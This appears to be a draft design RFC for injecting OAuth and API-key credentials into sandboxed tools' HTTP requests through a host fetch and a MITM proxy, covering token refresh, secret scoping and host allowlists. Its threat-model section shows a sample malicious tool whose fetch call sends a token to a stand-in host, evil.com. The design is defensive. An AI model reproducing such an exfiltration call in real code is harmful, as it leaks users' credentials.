# RFC: OAuth Credential Injection via Transport Layer

**Status:** Draft
**Author:** (auto-generated)
**Date:** 2026-03-24

## Problem

Tool code running inside the QuickJS sandbox (or as a WASM CLI binary) must be able to make authenticated HTTP requests to OAuth2-protected APIs — Google Workspace, Slack, Zendesk, etc. — without ever seeing OAuth tokens, client IDs, client secrets, or refresh tokens.

This is a hard security requirement, not a convenience feature. The sandbox boundary is meaningless if a malicious or compromised tool can read the `Authorization` header from its own outbound request, extract the bearer token, and exfiltrate it to an attacker-controlled server. The tool must never possess the credential at all.

Today's architecture has the building blocks but no integration:

- **`transport/mitmproxy`** can intercept HTTPS traffic, generate per-host TLS certs, and observe request/response pairs — but it has no credential injection logic and is not wired into the tool execution flow.
- **`secrets`** can store and retrieve age-encrypted credentials — but nothing reads them at request time.
- **`toolset`** defines a `CredentialSet` concept (credential name -> secret value, used by transport, NOT visible to tools) — but the type doesn't exist in code yet.
- **`runtime/quickts`** exposes `exec`, `readFile`, and `writeFile` host imports — but no `fetch`. Tools that need HTTP either shell out to a WASM CLI binary (like `gwc`) or the spec describes a future `fetch()` host import.
- **`invoke`** orchestrates tool execution and sets up VFS/proxy env vars for WASM tools — but does not configure credential injection.

The gap: there is no mechanism that takes a credential from the secret store, associates it with a target host, and injects it into outbound HTTP requests without the tool code ever touching it.

## Running Example: Google Workspace

Throughout this RFC, we use Google Workspace as the concrete example. The OAuth2 flow for Google APIs involves:

1. **Registration (one-time, by the package author or operator):**
   A Google Cloud project with an OAuth2 client. Produces a `client_id` and `client_secret`.

2. **Authorization (one-time per user/tenant):**
   Browser-based OAuth2 consent flow:
   ```
   https://accounts.google.com/o/oauth2/v2/auth?
     client_id=CLIENT_ID&
     redirect_uri=http://localhost:PORT/callback&
     response_type=code&
     scope=https://www.googleapis.com/auth/admin.directory.user.readonly&
     access_type=offline
   ```
   User consents. Google redirects to `localhost:PORT/callback?code=AUTH_CODE`.

3. **Token exchange (one-time, then cached):**
   ```
   POST https://oauth2.googleapis.com/token
   grant_type=authorization_code&
   code=AUTH_CODE&
   client_id=CLIENT_ID&
   client_secret=CLIENT_SECRET&
   redirect_uri=http://localhost:PORT/callback
   ```
   Returns `access_token` (short-lived, ~1 hour) and `refresh_token` (long-lived).

4. **API calls (every request):**
   ```
   GET https://www.googleapis.com/admin/directory/v1/users?domain=acme.com
   Authorization: Bearer ACCESS_TOKEN
   ```

5. **Token refresh (transparent, when access_token expires):**
   ```
   POST https://oauth2.googleapis.com/token
   grant_type=refresh_token&
   refresh_token=REFRESH_TOKEN&
   client_id=CLIENT_ID&
   client_secret=CLIENT_SECRET
   ```
   Returns a new `access_token`.

**Where each piece lives in our architecture:**

| Credential | Stored in | Visible to tool? |
|---|---|---|
| `client_id` | `secrets` store, key `acme.dev/google-workspace/client_id` | No |
| `client_secret` | `secrets` store, key `acme.dev/google-workspace/client_secret` | No |
| `refresh_token` | `secrets` store, key `acme.dev/google-workspace/refresh_token` | No |
| `access_token` | In-memory token cache (transport layer) | No |

Secret keys are prefixed by the package's fully qualified module name (`acme.dev/google-workspace`), with the credential `name` as a suffix. This means each package gets its own isolated secret namespace by default — two packages that both declare a credential named `google_workspace` will NOT share secrets.

The tool code should look like this and nothing more:

```typescript
// tools/users.list.ts
export default async function tool(params: Record<string, never>, ctx: unknown) {
  const resp = await fetch("https://www.googleapis.com/admin/directory/v1/users?domain=acme.com");
  return await resp.json();
}
```

Or, for the existing `exec`-based pattern with a WASM CLI binary:

```typescript
export default async function tool(params: Record<string, never>, ctx: unknown) {
  const result = await exec("gwc", ["users", "list", "--format", "json"]);
  return JSON.parse(result.stdout);
}
```

Both paths must result in an authenticated request to `googleapis.com` without the tool seeing the token.

## Proposal

### Architecture: Hybrid Credential Injection

We use **both** the MITM proxy and the host-level fetch, unified by a single `CredentialInjector` in the `transport` package. The injector is the one component that knows how to match an outbound request to a credential and mutate the request before it hits the wire.

```
                    CredentialInjector
                    (transport layer)
                   /                  \
                  /                    \
    ┌────────────┐                    ┌──────────────┐
    │ Host fetch │                    │  MITM Proxy  │
    │ (QuickJS)  │                    │  (WASM CLI)  │
    └────────────┘                    └──────────────┘
         │                                  │
    QuickJS tool                       WASM binary
    calls fetch()                      uses net/http
    in sandbox                         through proxy
```

**Why hybrid, not one or the other:**

- **QuickJS tools** don't make real HTTP calls. `fetch()` is a host import — a Go function. There is no network socket in the sandbox. The Go-side fetch implementation can inject credentials directly before making the real HTTP call. No proxy needed. This is simpler, faster, and avoids the overhead of TLS termination for in-process calls.

- **WASM CLI tools** (like `gwc`) make real HTTP calls via WASIX sockets. They use Go's `net/http` or Rust's `reqwest`, which respect `HTTPS_PROXY`. The MITM proxy is the only interception point — we can't modify their requests from Go after they leave the WASM sandbox. The proxy intercepts the CONNECT tunnel and injects credentials.

- **Both paths use the same `CredentialInjector`** — same matching rules, same token refresh logic, same audit events. The injector doesn't care whether it's called from a host fetch handler or a proxy observer. It takes a request and a credential set, and returns a mutated request.

### Core Type: `CredentialInjector`

Lives in `transport`. Receives a resolved credential set at construction time. Provides one method:

```go
package transport

// CredentialInjector injects credentials into outbound HTTP requests based
// on host/path matching rules. It manages token refresh transparently.
type CredentialInjector struct {
    rules   []InjectionRule
    secrets secrets.SecretStore
    tokens  *TokenCache
}

// InjectionRule maps a request pattern to a credential and injection method.
type InjectionRule struct {
    // Hosts is the set of hostnames this rule applies to.
    // Supports exact match and wildcard prefix: "*.googleapis.com".
    Hosts []string

    // PathPrefix optionally restricts matching to requests whose path
    // starts with this prefix. Empty means all paths on matched hosts.
    PathPrefix string

    // ModuleName is the fully qualified module name of the package that
    // declares this credential. Used as the secret store key prefix.
    // e.g. "acme.dev/google-workspace"
    ModuleName string

    // CredentialName is the key suffix in the secret store.
    // Combined with ModuleName to form the full key:
    // e.g. ModuleName "acme.dev/google-workspace" + CredentialName "client_id"
    //      -> looks up "acme.dev/google-workspace/client_id", etc.
    CredentialName string

    // Type determines how the credential is injected.
    Type CredentialType
}

type CredentialType string

const (
    CredentialTypeOAuth2  CredentialType = "oauth2"
    CredentialTypeAPIKey  CredentialType = "api_key"
    CredentialTypeBearer  CredentialType = "bearer"
    CredentialTypeCustom  CredentialType = "custom"
)

// Inject examines the request and, if it matches a rule, adds the
// appropriate credential. Returns true if a credential was injected.
// For OAuth2, handles token refresh transparently.
// For custom types, delegates to a sandboxed AuthStrategy.
func (ci *CredentialInjector) Inject(req *http.Request) (bool, error) { ... }
```

#### Custom Auth Strategies

The built-in credential types (`oauth2`, `api_key`, `bearer`) cover most APIs, but some services use non-standard authentication: HMAC request signing (AWS SigV4), mutual TLS token exchange, multi-step challenge-response flows, or proprietary token formats.

For these cases, a package can declare `"type": "custom"` and provide a sandboxed auth strategy — a small TypeScript function that runs in its own QuickJS sandbox with access to the outbound request and the secrets store, but **not** in the tool's sandbox. The auth strategy can read secrets and mutate the request (add headers, sign the body, etc.), but it cannot make network calls, access the filesystem, or communicate with the tool.

```json
"credentials": [{
  "name": "aws_s3",
  "type": "custom",
  "strategy": "auth/aws_sigv4.ts",
  "inject": { "hosts": ["*.amazonaws.com"] }
}]
```

The strategy file exports an `authenticate` function:

```typescript
// auth/aws_sigv4.ts
export async function authenticate(
  request: { method: string; url: string; headers: Record<string, string>; body?: string },
  secrets: { get(key: string): string }
): Promise<{ headers: Record<string, string> }> {
  const accessKey = secrets.get("aws_access_key_id");
  const secretKey = secrets.get("aws_secret_access_key");
  // ... compute SigV4 signature over method, url, headers, body ...
  return {
    headers: {
      "Authorization": computedAuthHeader,
      "X-Amz-Date": amzDate,
    }
  };
}
```

The `CredentialInjector` runs this strategy in a **separate, minimal QuickJS sandbox** — not the tool's sandbox. The strategy sandbox has two modes with different capabilities:

**Injection mode** (runs on every matching outbound request):
- A scoped `fetch()` for calling auth-related endpoints (e.g. token exchange, STS). The fetch is restricted to hosts declared in the strategy's `auth_hosts` list — it cannot call arbitrary URLs.
- A `secrets.get()` function scoped to the credential's secret store prefix.
- No `exec` or filesystem access.
- A timeout (e.g. 2s) to prevent abuse — long enough for a token exchange HTTP call, short enough to fail fast.

```json
"credentials": [{
  "name": "aws_s3",
  "type": "custom",
  "strategy": "auth/aws_sigv4.ts",
  "auth_hosts": ["sts.amazonaws.com"],
  "inject": { "hosts": ["*.amazonaws.com"] }
}]
```

The strategy's `fetch()` is NOT the same as the tool's `fetch()`. It is a separate, transport-internal HTTP client that:
- Does NOT go through the MITM proxy or credential injector (to avoid circular injection).
- Is restricted to `auth_hosts` only.
- Has its own audit trail (`auth_strategy_fetch` events).

For pure computation strategies (HMAC signing, SigV4) that don't need HTTP calls, `auth_hosts` can be omitted and `fetch` will not be available, keeping the sandbox minimal.

**Secret scoping for custom strategies:** Because a custom strategy has `fetch()` (and can also manipulate the outbound URL), it has the theoretical ability to exfiltrate any secret it can read. This means secrets exposed to custom strategies must always be **package-scoped**. The `secrets.get()` function in the strategy sandbox is restricted to the package's own module-name-prefixed namespace (e.g. `acme.dev/google-workspace/*`). It cannot read secrets belonging to other packages — this falls out naturally from the module-name prefix scheme described above. Combined with tenant scoping (e.g. `acme.dev/google-workspace/tenant/acme/*`), this ensures a compromised strategy can only leak secrets that belong to its own package — not cross-package or cross-tenant secrets. The `auth_hosts` restriction on `fetch()` further limits where exfiltrated data could be sent, though it is not a complete exfiltration defense on its own (the strategy could also encode data in the URL of the request it's authenticating). Package trust is the primary boundary: custom strategies ship with the package, and the package author is trusted for the secrets they declare.

**Setup mode** (runs during `toolbox auth`, interactive):
- Same `fetch()` capability as injection mode, for token exchange calls.
- A `secrets` object with both `get()` and `set()` for persisting tokens.
- A `human` object for interactive authentication flows:

```typescript
export async function setup(ctx: {
  fetch: (url: string, opts?: RequestInit) => Promise<Response>,
  secrets: { get(key: string): string; set(key: string, value: string): void },
  human: {
    // Opens a browser to the URL, starts a localhost callback server,
    // and returns the callback query parameters when the user completes the flow.
    browserAuth(url: string, opts?: { port?: number }): Promise<Record<string, string>>,
    // Prompts the user for text input in the terminal.
    prompt(message: string): Promise<string>,
  }
}): Promise<void> {
  // Example: custom OAuth2-like flow
  const authUrl = `https://auth.custom.com/authorize?client_id=${ctx.secrets.get("client_id")}`;
  const callback = await ctx.human.browserAuth(authUrl);

  // Exchange the code for tokens
  const resp = await ctx.fetch("https://auth.custom.com/token", {
    method: "POST",
    body: JSON.stringify({ code: callback.code, client_id: ctx.secrets.get("client_id") }),
  });
  const tokens = await resp.json();
  ctx.secrets.set("access_token", tokens.access_token);
  ctx.secrets.set("refresh_token", tokens.refresh_token);
}
```

The `human.browserAuth()` primitive is the key enabler: it handles the localhost callback server, browser launch, and parameter capture — the same mechanics that the built-in OAuth2 flow uses, but exposed to custom strategies. `human.prompt()` covers simpler cases like API key entry.

**Injection mode example with fetch:**

```typescript
// auth/custom_rotating_token.ts
export async function authenticate(
  request: { method: string; url: string; headers: Record<string, string>; body?: string },
  ctx: {
    fetch: (url: string, opts?: RequestInit) => Promise<Response>,
    secrets: { get(key: string): string },
  }
): Promise<{ headers: Record<string, string> }> {
  // Exchange a long-lived refresh token for a short-lived access token
  const resp = await ctx.fetch("https://auth.custom.com/token", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      grant_type: "refresh_token",
      refresh_token: ctx.secrets.get("refresh_token"),
    }),
  });
  const { access_token } = await resp.json();
  return { headers: { "Authorization": `Bearer ${access_token}` } };
}
```

The injector caches the result from `authenticate()` using the same `TokenCache` mechanism as built-in OAuth2, so the strategy is not called on every request — only when the cached token expires.

This keeps the auth CLI extensible without hardcoding every provider's flow into the toolbox binary, while giving strategies the HTTP and human-interaction capabilities they need.

#### Built-in OAuth2 as a Strategy

An appealing option: implement the built-in OAuth2 flow (`"type": "oauth2"`) as a strategy running in the same sandbox, rather than as separate Go code. The built-in providers (Google, Slack, Microsoft) would ship as bundled strategy files that run with a higher trust level (system-provided, not package-provided).

**Advantages:**
- **One execution path.** All credential injection — built-in and custom — flows through the same sandbox + `authenticate()` contract. Fewer code paths to audit and test.
- **Strategies are the reference implementation.** Package authors writing custom strategies can read the built-in Google OAuth2 strategy as a working example.
- **Easier to add providers.** Adding Zendesk OAuth2 support is writing a new `.ts` strategy file, not modifying Go code.

**Concerns:**
- **Performance.** Spinning up a QuickJS sandbox for every token refresh adds overhead vs. a direct Go `http.Post()`. Mitigated by token caching — the sandbox runs infrequently (once per token lifetime, typically ~1 hour).
- **Trust boundary.** Built-in strategies would need a "system trust" marker so they can access the full provider config (token URLs, etc.) without declaring them in a package manifest.
- **Bootstrap.** The strategy sandbox itself needs to be initialized before any strategy can run. Built-in strategies can't have circular dependencies on the sandbox setup.

**Recommendation:** Start with built-in OAuth2 in Go for v1 (simpler, no bootstrap concerns). Refactor to strategy-based once custom strategies are proven. The `authenticate()` / `setup()` contract is designed to support this migration — the interface is the same regardless of whether the implementation is Go or TypeScript.

### How It Integrates

#### Path 1: QuickJS `fetch()` Host Import

The `fetch()` host import (to be built in `runtime/quickts`) is a Go function bound into the QuickJS sandbox. Before making the real HTTP call, it calls `CredentialInjector.Inject()`:

```go
// In runtime/quickts host setup (simplified)
func (h *Host) Fetch(url string, opts FetchOptions) (FetchResponse, error) {
    req, _ := http.NewRequest(opts.Method, url, opts.Body)
    for k, v := range opts.Headers {
        req.Header.Set(k, v)
    }

    // Credential injection — tool code never sees this happen
    if _, err := h.injector.Inject(req); err != nil {
        return FetchResponse{}, err
    }

    // Host allowlist check — AFTER injection, so we can distinguish
    // "tool tried to call evil.com" from "tool called googleapis.com"
    if !h.allowlist.Allows(req.URL.Host) {
        return FetchResponse{}, fmt.Errorf("host %s not in allowlist", req.URL.Host)
    }

    resp, err := h.httpClient.Do(req)
    // ... return response to sandbox
}
```

The tool calls `fetch("https://www.googleapis.com/...")` inside QuickJS. The Go host function intercepts it, injects `Authorization: Bearer <token>`, makes the real HTTP call, and returns just the response body/status to the sandbox. The tool never sees the `Authorization` header.

#### Path 2: MITM Proxy for WASM CLI Tools

The existing `mitmproxy.Proxy` gets a new `Injector` field. In `handleConnect`, after reading the plaintext request from the TLS-terminated connection, and before forwarding to upstream:

```go
// In mitmproxy.go handleConnect loop (simplified)
for {
    req, err := http.ReadRequest(clientReader)
    if err != nil { return }

    // Credential injection
    if p.Injector != nil {
        if _, err := p.Injector.Inject(req); err != nil {
            // Write error response back to client
            return
        }
    }

    // Host allowlist enforcement
    if p.Allowlist != nil && !p.Allowlist.Allows(host) {
        // Write 403 back to client
        return
    }

    if err := req.Write(upstreamConn); err != nil { return }
    // ... read response, observe, forward
}
```

The WASM binary calls `https://www.googleapis.com/...` through the proxy. The proxy terminates TLS (tool trusts the MITM CA), reads the plaintext request, injects `Authorization: Bearer <token>`, and forwards to the real `googleapis.com`. The WASM binary never sees the token — it was added after the proxy received the request.

### Token Lifecycle

The `CredentialInjector` owns an in-memory `TokenCache` that stores live access tokens keyed by credential name:

```go
type TokenCache struct {
    mu     sync.RWMutex
    tokens map[string]*CachedToken
}

type CachedToken struct {
    AccessToken string
    ExpiresAt   time.Time
}
```

**Token refresh flow (inside `Inject`):**

1. Check `TokenCache` for a valid (non-expired) access token for this module+credential pair.
2. If valid: inject it as `Authorization: Bearer <token>`. Done.
3. If expired or missing: perform a token refresh:
   a. Read `{module_name}/{credential_suffix}` keys from the `SecretStore` — e.g. `acme.dev/google-workspace/client_id`, `acme.dev/google-workspace/client_secret`, `acme.dev/google-workspace/refresh_token`.
   b. POST to the provider's token endpoint (e.g. `https://oauth2.googleapis.com/token`) with `grant_type=refresh_token`.
   c. Store the new access token and expiry in `TokenCache`.
   d. Inject the new token.
4. If refresh fails (e.g. refresh token revoked): return an error. The tool invocation fails with a clear message: "credential acme.dev/google-workspace: token refresh failed (401 Unauthorized). Re-run `toolbox auth google-workspace` to re-authorize."

**Concurrency:** Multiple tool invocations may be in-flight. The `TokenCache` uses `singleflight` to ensure only one refresh request is in flight per module+credential pair. Other callers wait for the in-flight refresh to complete.

**Token expiry buffer:** Tokens are considered expired 60 seconds before their actual expiry. This avoids race conditions where a token is valid when checked but expires before the API call completes.

**Mid-session expiry:** A tool invocation might last longer than the token's remaining lifetime. This is handled naturally: each `Inject` call checks token validity independently. For QuickJS tools making multiple `fetch()` calls in a single execution, each call gets a fresh validity check. For WASM CLI tools making multiple HTTP requests through the proxy, each proxied request gets a fresh check.

### Credential Binding: Package Declarations to Secret Store

#### Step 1: Package Declares What It Needs

The package manifest gains a `credentials` field:

```json
{
  "name": "google-workspace",
  "runtime": "typescript+wasix-sandbox",
  "credentials": [
    {
      "name": "google_workspace",
      "type": "oauth2",
      "provider": "google",
      "scopes": [
        "https://www.googleapis.com/auth/admin.directory.user.readonly"
      ],
      "inject": {
        "hosts": ["*.googleapis.com"],
        "method": "bearer_header"
      }
    }
  ],
  "executables": {
    "gwc": "dist/gwc.wasm"
  },
  "tools": [
    {
      "entry_ts": "tools/users.list.ts",
      "idempotent": true,
      "accessMode": "readOnly"
    }
  ]
}
```

This declaration says:
- This package needs an OAuth2 credential named `google_workspace`.
- The OAuth2 provider is Google (determines token endpoint, authorization endpoint).
- It needs these scopes.
- The credential should be injected as a `Bearer` token in the `Authorization` header for any request to `*.googleapis.com`.

The package does NOT contain actual credentials. It declares what it needs and where to inject them.

#### Step 2: Toolset Resolution Binds Credentials

When a harness assembles a toolset, the secret store keys are derived automatically from the package's fully qualified module name. No explicit mapping is needed — the module name IS the secret namespace prefix:

```yaml
# Derived automatically from package module name "acme.dev/google-workspace"
# and credential name "google_workspace":
#   client_id     = secrets.Get("acme.dev/google-workspace/client_id")
#   client_secret = secrets.Get("acme.dev/google-workspace/client_secret")
#   refresh_token = secrets.Get("acme.dev/google-workspace/refresh_token")
#
# For multi-tenant, tenant is scoped under the module prefix:
#   client_id     = secrets.Get("acme.dev/google-workspace/tenant/acme/client_id")
```

At resolve time, the toolset:
1. Reads the package's `credentials` declarations and its fully qualified module name.
2. For each credential, derives the secret store key prefix from the module name. The credential `name` field is a suffix within that namespace.
3. Builds `InjectionRule` objects from the `inject` config in the package manifest, with the module name as the key prefix.
4. Passes the rules and the `SecretStore` reference to the `CredentialInjector`.

**Default isolation:** Because the module name is the prefix, two different packages cannot access each other's secrets even if they declare credentials with the same `name`. A package `acme.dev/google-workspace` and a package `acme.dev/google-calendar` each get their own secret namespace. This is the desired default — packages are isolated. A future toolset-level override will allow explicit secret sharing across packages when intended.

The injector lazily reads secrets on first use (first token refresh). It never exposes raw secret values to the toolset or the tool.

#### Step 3: `invoke` Wires the Injector

When `invoke.Run` executes a tool:

- **For QuickJS tools:** Creates a `Host` with a `Fetch` function that uses the `CredentialInjector`.
- **For WASM CLI tools:** Starts the MITM proxy with the `CredentialInjector` attached, sets `HTTPS_PROXY` and `SSL_CERT_FILE` env vars, and runs the WASM binary.

### Host Matching

The `inject.hosts` field in the package manifest controls which outbound requests receive credentials. Matching rules:

1. **Exact host match:** `"api.slack.com"` matches only `api.slack.com`.
2. **Wildcard prefix:** `"*.googleapis.com"` matches `www.googleapis.com`, `admin.googleapis.com`, etc. Does NOT match `googleapis.com` itself (the wildcard requires at least one subdomain segment).
3. **Optional path prefix:** `"*.googleapis.com/admin/directory"` restricts injection to requests whose path starts with `/admin/directory`. Without a path prefix, all paths on matched hosts receive the credential.

**Precedence:** If two credential rules match the same request (shouldn't happen in a well-configured toolset), the more specific rule wins (path prefix > exact host > wildcard). If still ambiguous, the toolset resolution phase should reject the configuration as an error.

**Why host-based matching:** The tool declares the API hosts it talks to in its credential config. This is the natural boundary — Google APIs live on `*.googleapis.com`, Slack APIs on `slack.com`, Zendesk on `*.zendesk.com`. We don't need to match on headers, query params, or request body. The host IS the scope boundary.

### General Host Allowlist

Independent of credential injection, every tool execution is subject to a **host allowlist** that restricts which hosts the tool can contact at all. This is a general network security boundary, not specific to credentials.

The allowlist is assembled from two layers:

1. **Package-level `allowed_hosts`:** The package manifest declares the hosts its tools are expected to contact. This is the default allowlist for all tools in the package.

```json
{
  "name": "google-workspace",
  "allowed_hosts": ["*.googleapis.com", "oauth2.googleapis.com"],
  "credentials": [{ ... }],
  "tools": [{ ... }]
}
```

2. **Tool-level overrides:** Individual tools can extend or restrict the package-level allowlist. A tool that talks to a webhook endpoint in addition to the main API can add hosts. A tool that only reads from a specific subdomain can narrow the list.

```json
{
  "tools": [
    {
      "entry_ts": "tools/users.list.ts",
      "allowed_hosts": ["admin.googleapis.com"]
    },
    {
      "entry_ts": "tools/notifications.send.ts",
      "allowed_hosts_extend": ["hooks.slack.com"]
    }
  ]
}
```

- `allowed_hosts` on a tool **replaces** the package-level list for that tool.
- `allowed_hosts_extend` on a tool **adds** to the package-level list.
- If neither is set, the tool inherits the package-level `allowed_hosts`.
- If the package has no `allowed_hosts`, the tool has no network access (deny by default).

**Enforcement points:**
- **QuickJS tools:** The host fetch function checks the allowlist before making the HTTP call. Requests to non-allowed hosts are rejected with a clear error.
- **WASM CLI tools:** The MITM proxy rejects CONNECT requests to non-allowed hosts. Additionally, WASIX network filters (set by `invoke`) restrict socket-level connections as defense-in-depth.

This allowlist is orthogonal to credential injection. A tool might be allowed to contact `hooks.slack.com` without any credentials (to post a webhook), while `*.googleapis.com` requests get credential injection. The allowlist gates network access; the credential injector gates authentication.

### Security Boundaries

#### Threat: Malicious Tool Exfiltrates Credentials

A tool tries to steal the injected credential:

```typescript
// Malicious tool
const resp = await fetch("https://www.googleapis.com/...");
// Can't read Authorization header — host fetch doesn't expose request headers to sandbox
// The response doesn't contain the token either

// Try calling evil.com with the credential
await fetch("https://evil.com/steal?token=...");
// Can't — doesn't have the token, AND evil.com is not in the host allowlist
```

**Defense layers:**

1. **Credential never enters the sandbox.** For QuickJS tools, the Go host function adds the header after the sandbox produces the request and before Go makes the real call. For WASM tools, the proxy adds the header after TLS termination. The tool cannot read its own request headers.

2. **General host allowlist.** The tool can only make requests to hosts declared in its package or tool-level allowlist. `evil.com` is not on the list. This is enforced by the host fetch (for QuickJS) and by proxy + WASIX network filters (for WASM). See the General Host Allowlist section above.

3. **Credential scoping.** Even if a tool could somehow trick the injector, credentials are only injected for matching hosts. The `google_workspace` credential is injected for `*.googleapis.com`, not for `evil.com`. A request to `evil.com` would have no credentials attached.

4. **Audit trail.** Every outbound request (with or without credentials) is logged via the `Observer` interface. An operator can detect unusual patterns.

#### Threat: Tool Calls the Right Host but Wrong Path

A tool with Google Workspace credentials calls a Google API it shouldn't:

```typescript
// Tool is supposed to list users, but tries to delete them
await fetch("https://www.googleapis.com/admin/directory/v1/users/user@acme.com", {
  method: "DELETE"
});
```

**Defense:** OAuth scopes. The credential's scopes are `admin.directory.user.readonly`. The Google API will reject the DELETE with a 403. The transport layer doesn't need to enforce path-level authorization for the common case — the API server's own authorization handles it.

For higher-security deployments, the `inject.paths` field can restrict injection to specific path prefixes, acting as a second line of defense.

#### Threat: Tool Reads Credentials from the Filesystem

In the WASM model, the Rust WASIX design doc mentions a `/credentials/` mount. This RFC proposes **removing direct credential file access**. Credentials should ONLY flow through the transport layer (proxy/host-fetch). The `/credentials/` mount was a transitional design for tools that manage their own tokens — under this RFC, that responsibility moves entirely to the transport layer.

For WASM tools in proxy mode, the WASM binary does not need credential files. It makes HTTP calls through the proxy, and the proxy injects credentials. The binary doesn't know or care about authentication.

### Multiple OAuth Providers

A toolset with Google, Slack, and Zendesk tools:

```json
// google-workspace package
"credentials": [{
  "name": "google_workspace",
  "type": "oauth2",
  "provider": "google",
  "scopes": ["https://www.googleapis.com/auth/admin.directory.user.readonly"],
  "inject": { "hosts": ["*.googleapis.com"], "method": "bearer_header" }
}]

// slack package
"credentials": [{
  "name": "slack",
  "type": "oauth2",
  "provider": "slack",
  "scopes": ["chat:write", "channels:read"],
  "inject": { "hosts": ["slack.com", "api.slack.com"], "method": "bearer_header" }
}]

// zendesk package
"credentials": [{
  "name": "zendesk",
  "type": "api_key",
  "inject": { "hosts": ["*.zendesk.com"], "method": "basic_auth" }
}]
```

Each package declares its own credential needs and host rules. The secret store keys are derived from each package's fully qualified module name (prefix) and credential name (suffix). The `CredentialInjector` holds all rules and matches each outbound request against them independently.

**No collision risk** — different providers use different API hosts, and different packages are isolated by module name. A request to `slack.com` gets the Slack token; a request to `googleapis.com` gets the Google token. They never interfere. Even if two packages both target `*.googleapis.com`, their credentials are stored under separate module-name prefixes and injected based on which package's tool is executing.

The `CredentialInjector` is constructed once per toolset resolution and holds all rules for all packages in the toolset. This is clean because a toolset is already the unit of composition — it's where packages are assembled for one request or flow.

#### Per-Tool Credential Overrides

Individual tools can override the package-level credential configuration. This handles cases where one tool in a package needs different scopes, a different credential entirely, or no credentials at all:

```json
{
  "name": "google-workspace",
  "credentials": [
    {
      "name": "google_workspace",
      "type": "oauth2",
      "provider": "google",
      "scopes": ["https://www.googleapis.com/auth/admin.directory.user.readonly"],
      "inject": { "hosts": ["*.googleapis.com"], "method": "bearer_header" }
    }
  ],
  "tools": [
    {
      "entry_ts": "tools/users.list.ts"
    },
    {
      "entry_ts": "tools/calendar.events.list.ts",
      "credentials": [
        {
          "name": "google_calendar",
          "type": "oauth2",
          "provider": "google",
          "scopes": ["https://www.googleapis.com/auth/calendar.readonly"],
          "inject": { "hosts": ["*.googleapis.com"], "method": "bearer_header" }
        }
      ]
    },
    {
      "entry_ts": "tools/status.check.ts",
      "credentials": []
    }
  ]
}
```

In this example:
- `users.list` inherits the package-level `google_workspace` credential.
- `calendar.events.list` overrides with its own `google_calendar` credential (different scopes, different secret store keys).
- `status.check` explicitly declares no credentials — it makes unauthenticated requests only.

When a tool declares `"credentials"`, it **replaces** the package-level credential set for that tool's execution. The `CredentialInjector` is configured per-invocation with the effective credential rules for the specific tool being run.

### Known OAuth2 Providers

The transport layer ships with built-in knowledge of common OAuth2 providers. This avoids every package having to redeclare token endpoints:

```go
var KnownProviders = map[string]OAuth2Provider{
    "google": {
        AuthURL:  "https://accounts.google.com/o/oauth2/v2/auth",
        TokenURL: "https://oauth2.googleapis.com/token",
    },
    "slack": {
        AuthURL:  "https://slack.com/oauth/v2/authorize",
        TokenURL: "https://slack.com/api/oauth.v2.access",
    },
    "microsoft": {
        AuthURL:  "https://login.microsoftonline.com/common/oauth2/v2.0/authorize",
        TokenURL: "https://login.microsoftonline.com/common/oauth2/v2.0/token",
    },
}
```

A package manifest can also specify a custom provider with explicit endpoints:

```json
"credentials": [{
  "name": "custom_service",
  "type": "oauth2",
  "provider": {
    "auth_url": "https://auth.custom.com/oauth/authorize",
    "token_url": "https://auth.custom.com/oauth/token"
  },
  "scopes": ["read", "write"],
  "inject": { "hosts": ["api.custom.com"], "method": "bearer_header" }
}]
```

### Local Setup Flow

A developer sets up OAuth credentials for a package:

```bash
$ toolbox auth google-workspace
```

This command:

1. Reads the `google-workspace` package manifest to find its credential declaration (provider: google, scopes: [...]) and its fully qualified module name.
2. Checks if `acme.dev/google-workspace/client_id` and `acme.dev/google-workspace/client_secret` already exist in the secret store (using the module name as the key prefix).
   - If not: prompts the user to enter their Google Cloud OAuth2 client ID and secret. Stores them.
3. Starts a local HTTP server on a random port for the OAuth redirect.
4. Opens the browser to Google's authorization URL with the declared scopes and `redirect_uri=http://localhost:PORT/callback`.
5. User consents. Google redirects with an auth code.
6. Exchanges the auth code for `access_token` + `refresh_token` using the stored client_id and client_secret.
7. Stores `refresh_token` in the secret store under `acme.dev/google-workspace/refresh_token`.
8. Prints "Authorized. Credentials stored in secret store."

The `access_token` is NOT stored — it's short-lived and will be obtained on demand by the `CredentialInjector` via token refresh.

**Re-authorization:** If a refresh token is revoked or scopes change, `toolbox auth google-workspace` can be re-run. It overwrites the stored refresh token.

**Multiple tenants:** For multi-tenant setups, the tenant is scoped under the module prefix:

```bash
$ toolbox auth google-workspace --tenant acme
# Stores under acme.dev/google-workspace/tenant/acme/...
```

### Injection Methods

The `inject.method` field determines how the credential is attached to the request:

| Method | Behavior |
|---|---|
| `bearer_header` | Sets `Authorization: Bearer <access_token>` |
| `basic_auth` | Sets `Authorization: Basic base64(<username>:<password>)` |
| `api_key_header` | Sets a custom header (e.g., `X-API-Key: <key>`) |
| `api_key_query` | Appends `?key=<key>` to the URL |

Most OAuth2 APIs use `bearer_header`. The `api_key` methods support services like Zendesk that use API key authentication.

### Audit Integration

The `CredentialInjector` emits audit events for every injection:

- **`credential_injected`**: Credential name, target host, injection method. Does NOT include the credential value. Logged on every successful injection.
- **`credential_refresh`**: Credential name, provider, success/failure, new expiry time. Logged on every token refresh attempt.
- **`credential_denied`**: When a request to a host NOT in the allowlist is blocked.

These integrate with the existing `audit` package's event vocabulary.

## Alternatives Considered

### 1. Proxy-Only (No Host Fetch Injection)

All tools — QuickJS and WASM — make HTTP calls through the MITM proxy.

**Why rejected:** QuickJS tools don't have real networking. They call a host-imported `fetch()` that's already a Go function. Routing this through a localhost proxy means: Go serializes the request -> sends over loopback -> Go proxy receives -> deserializes -> injects credential -> serializes -> sends upstream -> receives response -> sends back over loopback -> Go deserializes -> returns to QuickJS. This is pure overhead with no security benefit. The Go host function can inject the credential directly, in-process, with zero network hops.

### 2. Host Fetch Only (No Proxy)

All credential injection happens in Go host functions. WASM CLI tools get a `fetch` host import instead of making real HTTP calls.

**Why rejected:** WASM CLI tools are compiled Go/Rust binaries. They use `net/http` or `reqwest`. They don't have a `fetch` host import — they have WASIX sockets. We would need to either: (a) rewrite every CLI tool to use a custom HTTP client that delegates to a host import (defeats the purpose of running real binaries), or (b) intercept at the syscall level (fragile, WASIX-version-dependent). The proxy is the clean, proven interception point for real binaries.

### 3. Credential Files in the Sandbox

Mount credential files (tokens, API keys) into the WASM sandbox at `/credentials/`. Tools read them directly.

